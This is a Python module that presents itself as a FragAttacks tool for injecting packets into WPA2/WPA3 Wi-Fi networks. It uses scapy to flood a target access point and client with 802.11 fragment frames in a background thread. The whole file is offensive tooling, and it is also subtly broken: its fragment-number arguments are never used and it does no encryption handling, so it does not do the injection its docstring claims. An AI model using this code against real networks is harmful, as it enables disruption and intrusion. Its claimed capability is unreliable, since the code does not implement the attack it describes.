"""
FragAttacks (2021)
==================
802.11 fragmentation and aggregation attacks.

Exploits frame fragmentation to inject arbitrary packets
into encrypted WiFi networks (WPA2/WPA3).
"""

import random
import threading
import time
from typing import Optional, Dict, Any


class FragAttacker:
    """802.11 fragmentation attack engine."""

    def __init__(self, iface: str):
        self.iface = iface
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self.stats: Dict[str, Any] = {
            "fragments_sent": 0,
            "injections_attempted": 0,
        }

    def _random_mac(self) -> str:
        """Generate random MAC address."""
        return ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))

    def _build_fragment(self, bssid: str, client_mac: str,
                       fragment_num: int, total_frags: int,
                       payload: bytes) -> Any:
        """Build 802.11 fragment frame."""
        try:
            from scapy.all import Dot11, Dot11FCS, RadioTap
            frame = (
                RadioTap()
                / Dot11(addr1=client_mac, addr2=bssid, addr3=bssid,
                        type=2, subtype=8, FCfield=0x04)  # More fragments
            )
            if payload:
                frame /= payload
            return frame
        except Exception:
            return None

    def start(self, target_bssid: str, client_mac: str,
              payload: bytes = b"", count: int = 0,
              interval: float = 0.05) -> bool:
        """
        Start fragmentation attack.

        Args:
            target_bssid: Target AP MAC
            client_mac: Target client MAC
            payload: Payload to inject
            count: Number of fragment pairs (0 = infinite)
            interval: Delay between fragments

        Returns:
            True if attack started successfully
        """
        self._running = True
        self._thread = threading.Thread(
            target=self._flood_loop,
            args=(target_bssid, client_mac, payload, count, interval),
            daemon=True,
        )
        self._thread.start()
        return True

    def _flood_loop(self, target_bssid: str, client_mac: str,
                    payload: bytes, count: int, interval: float) -> None:
        """Main fragment transmission loop."""
        try:
            from scapy.all import sendp
            sent = 0
            while self._running and (count == 0 or sent < count):
                # Send fragment 1
                frag1 = self._build_fragment(
                    target_bssid, client_mac, 1, 2, payload[:50]
                )
                if frag1:
                    sendp(frag1, iface=self.iface, verbose=0)
                    self.stats["fragments_sent"] += 1

                time.sleep(interval / 2)

                # Send fragment 2
                frag2 = self._build_fragment(
                    target_bssid, client_mac, 2, 2, payload[50:]
                )
                if frag2:
                    sendp(frag2, iface=self.iface, verbose=0)
                    self.stats["fragments_sent"] += 1

                self.stats["injections_attempted"] += 1
                sent += 1
                time.sleep(interval)
        except Exception as e:
            print(f"[Frag] Attack loop error: {e}")

    def stop(self) -> None:
        """Stop fragmentation attack."""
        self._running = False
        if self._thread:
            self._thread.join(timeout=3)

    def get_stats(self) -> Dict[str, Any]:
        """Return attack statistics."""
        return {**self.stats, "running": self._running}
